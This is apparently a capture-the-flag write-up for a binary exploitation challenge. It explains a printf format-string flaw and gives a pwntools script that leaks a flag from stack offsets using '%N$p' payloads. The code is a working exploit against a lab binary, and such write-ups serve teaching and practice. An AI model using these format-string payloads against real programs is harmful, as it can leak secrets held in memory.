# E.L.I.A
## Challenge
This challenge first reads the flag from the file `flag.txt` and saves it on the **stack**. Then, it requests input from the user and subsequently prints it insecurely using `printf` without any **defined format**.

This executable can therefore be exploited if the correct offsets on the stack of the flag (from 8 to 13) are found and used together with `%p` in the format `%x$p` where *x* is the offset.

## Solution
```py
#!/usr/bin/env python3
from pwn import args, remote, process

# Change this to remote if you want to run it on remote server
if args.REMOTE:
    r = remote('localhost', 1339) # change host and port
else:
    r = process('./elia')

r.recvuntil(b'?\n')
PAYLOAD = b''
for i in range(8, 13):
    PAYLOAD += f'%{i}$p'.encode()

r.sendline(PAYLOAD)
flag = [int(i, 16) for i in r.recvline().decode().split('0x')[1:]]
pascal = ''
for i in flag:
    pascal += i.to_bytes(8, 'little').decode()

pascal = pascal.replace('\x00', '')
print(pascal)
```

## Author
**Author**: [`@AlBovo`](https://github.com/AlBovo/)<br>
**Date**: 2024-07-19 <br>
**Category**: Binary Exploitation
